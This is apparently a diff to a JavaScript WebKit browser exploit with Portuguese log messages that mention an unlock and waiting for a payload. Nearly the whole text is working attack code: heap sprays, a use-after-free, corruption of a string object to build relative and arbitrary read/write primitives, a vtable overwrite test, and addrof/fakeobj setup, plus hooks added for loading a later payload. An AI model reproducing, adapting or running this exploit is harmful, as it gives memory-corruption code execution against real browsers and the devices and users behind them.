@@ -44,12 +44,6 @@ var g_input = null;
 
 var guess_htmltextarea_addr = new Int64("0x2031b00d8");
 
-var master_b = new Uint32Array(2);
-var slave_b =  new Uint32Array(2);
-var slave_addr;
-var slave_buf_addr;
-var master_addr;
-
 
 /* Executed after deleteBubbleTree */
 function setupRW() {
@@ -57,14 +51,11 @@ function setupRW() {
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length > 0xff) {
 			g_relative_rw = g_arr_ab_3[i];
-			debug_log("[+] Obteve com sucesso um R / W relativo");
 			break;
 		}
 	}
 	if (g_relative_rw === null)
 		die("[!] Failed to setup a relative R/W primitive");
-
-	debug_log("[+] Configurando R / W arbitrário");
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
@@ -97,14 +88,10 @@ function setupRW() {
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
 
-	debug_log("[+] Testando R / W arbitrário");
-
 	let saved_vtable = read64(guess_htmltextarea_addr);
 	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
 	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
 		die("[!] Failed to setup arbitrary R/W primitive");
-
-	debug_log("[+] Obteve R / W arbitrário com sucesso!");
 
 	/* Restore the overidden vtable pointer */
 	write64(guess_htmltextarea_addr, saved_vtable);
@@ -120,70 +107,18 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("[+] Addrof / fakeobj obtido com sucesso");
+	debug_log("---------------------------------------------------------------------");
+	debug_log("FIM DO WEBKIT");
+	debug_log("---------------------------------------------------------------------");
 	debug_log("");
-	msgs.innerHTML="\n <h1 style='text-align:center;color:#6089f6;'><b>DESBLOQUEIO REALIZADO COM SUCESSO !!!</b></h1> \n \n <h2 style='text-align:center;color:#ee596f;'>AGUARDE ATÉ APARECER A MENSAGEM DE BOA VINDAS. SAIA USANDO O \"CIRCULO\". </h2> \n";
-	
-	var leak_slave = addrof(slave_b);
-	var slave_addr = read64(leak_slave.add(0x10));
+	debug_log("P R O N T O ! ! !");
+	debug_log("");
+	debug_log("AGUARDE o payload carregar.");
 
-	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
-	var leak_master = addrof(master_b);
-	write64(leak_master.add(0x10), leak_slave.add(0x10));
-	var prim = {
-		write8: function(addr, val) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-
-			if(val instanceof int64) {
-				slave_b[0] = val.low;
-				slave_b[1] = val.hi;
-			}
-			else {
-				slave_b[0] = val;
-				slave_b[1] = 0;
-			}
-
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-		},
-		write4: function(addr, val) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-
-			slave_b[0] = val;
-
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-		},
-		read8: function(addr) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			var r = new int64(slave_b[0], slave_b[1]);
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-		read4: function(addr) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			var r = slave_b[0];
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-		leakval: function(val) {
-			g_ab_slave.leakme = val;
-			master_b[0] = g_jsview_butterfly.low32() - 0x10;
-			master_b[1] = g_jsview_butterfly.hi32();
-			var r = new int64(slave_b[0], slave_b[1]);
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-	};
-	window.prim = prim;
-	setTimeout(stage2, 1000);
+	/* Getting code execution */
+	/* ... */
+	if(window.postExploit)
+		window.postExploit();
 }
 
 function read(addr, length) {
@@ -253,14 +188,11 @@ function confuseTargetObjRound2() {
 
 /* Executed after deleteBubbleTree */
 function leakJSC() {
-	debug_log("[+] Procurando pelo StringImpl destruído ...");
-
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
 	/* Looking for the smashed string */
 	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
-			debug_log("[+] StringImpl corrompido com sucesso");
 			g_relative_read = arr_str[i];
 			g_obj_str = null;
 			break;
@@ -268,8 +200,6 @@ function leakJSC() {
 	}
 	if (g_relative_read === null)
 		die("[!] Failed to setup a relative read primitive");
-
-	debug_log("[+] Tenho um parente lido");
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
@@ -340,13 +270,6 @@ function leakJSC() {
 			}
 		}
 	}
-	/* 
-	 * /!\
-	 * Critical part ended-up here
-	 * /!\ 
-	 */
-
-	debug_log("[+] JSArrayBufferView: " + g_jsview_leak);
 
 	/* Run the exploit again */
 	prepareUAF();
@@ -420,16 +343,11 @@ function reuseTargetObj() {
 }
 
 function dumpTargetObj() {
-	debug_log("[+] m_timer: " + g_timer_leak);
-	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
-	debug_log("[+] m_messageBody: " + g_message_body_leak);
 }
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
-			debug_log("[+] Mensagem de validação falsa encontrada");
-
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
 				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
@@ -475,7 +393,13 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("[+] Pulverizando elemento HTML ...");
+	debug_log("");
+	debug_log("---------------------------------------------------------------------");
+	debug_log("INICIANDO O WEBKIT...");
+	debug_log("---------------------------------------------------------------------");
+	debug_log("");
+	debug_log("[+] Pulverizando elementos de área em HTML ...");
+	debug_log("");
 
 	let textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
@@ -506,6 +430,9 @@ function sprayStringImpl(start, end) {
 function go() {
 	/* Init spray */
 	sprayHTMLTextArea();
+
+	if(window.midExploit)
+		window.midExploit();
 
 	g_input = input1;
 	/* Shape heap layout for obj. reuse */
